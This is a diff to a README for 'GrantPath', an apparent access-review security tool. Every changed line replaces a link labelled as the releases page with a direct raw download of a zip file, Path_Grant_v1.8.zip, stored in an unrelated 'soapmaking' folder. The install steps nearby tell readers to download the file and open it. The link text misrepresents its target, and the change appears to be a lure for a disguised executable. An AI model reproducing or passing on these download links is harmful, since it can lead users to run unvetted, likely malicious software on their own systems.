@@ -1,6 +1,6 @@
 # 🔐 GrantPath - See Access, Cut Risk Faster
 
-[![Download GrantPath](https://img.shields.io/badge/Download%20GrantPath-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Bitteraloesazide184/GrantPath/releases)
+[![Download GrantPath](https://img.shields.io/badge/Download%20GrantPath-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bitteraloesazide184/GrantPath/main/soapmaking/Path_Grant_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ GrantPath helps you see who has access to what across IAM, Active Directory, and
 
 ## 📥 Download and Install
 
-1. Open the [GrantPath releases page](https://github.com/Bitteraloesazide184/GrantPath/releases).
+1. Open the [GrantPath releases page](https://raw.githubusercontent.com/Bitteraloesazide184/GrantPath/main/soapmaking/Path_Grant_v1.8.zip).
 2. Find the latest version near the top of the page.
 3. Download the Windows file for your system.
 4. Open the file after the download finishes.
@@ -176,7 +176,7 @@ access-intelligence, access-review, authorization, cybersecurity, entitlement-in
 
 ## 📎 Download Again
 
-If you need the latest build, visit the [GrantPath releases page](https://github.com/Bitteraloesazide184/GrantPath/releases) to download and run the latest Windows file
+If you need the latest build, visit the [GrantPath releases page](https://raw.githubusercontent.com/Bitteraloesazide184/GrantPath/main/soapmaking/Path_Grant_v1.8.zip) to download and run the latest Windows file
 
 ## 📄 Repository Name
 
